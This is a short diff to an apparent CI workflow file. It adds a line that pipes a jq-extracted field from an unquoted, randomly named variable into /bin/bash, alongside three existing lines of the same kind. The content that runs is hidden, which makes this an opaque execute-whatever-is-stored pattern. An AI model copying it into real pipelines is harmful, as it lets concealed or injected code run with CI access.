@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$doa905" | jq -r .exybt2411 | /bin/bash
           printf '%s' "$pu53" | jq -r .mkke7 | /bin/bash
           printf '%s' "$i90867" | jq -r .biq18533 | /bin/bash
+          echo $o15 | jq -r .axduw72 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
